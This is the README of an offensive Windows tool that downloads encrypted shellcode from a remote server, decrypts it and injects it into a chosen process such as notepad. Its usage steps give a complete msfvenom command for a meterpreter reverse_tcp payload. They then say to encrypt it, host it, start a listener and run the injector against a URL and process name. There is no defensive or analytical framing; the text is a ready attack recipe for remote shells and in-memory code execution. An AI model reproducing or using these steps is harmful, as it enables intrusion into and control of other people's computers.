# ShellCode-Injection
  
    Download and decrypt a shellcode from a remote webserver, then inject it to a given process name

# Usage
  
   1. Generate the shellcode

          msfvenom -p windows/x64/meterpreter/reverse_tcp --smallest exitfunc=thread lhost=x.x.x.x lport=xxxx -f raw -o shellcode.bin
   
   2. Encrypt the shellcode

          .\ShellCode_Encryptor.exe shellcode.bin

   3. Host the encrypted shellcode and start the listener

   4. Execute

          .\ShellCode_Injection.exe <shellcode_Url> <process_name eg. notepad> 
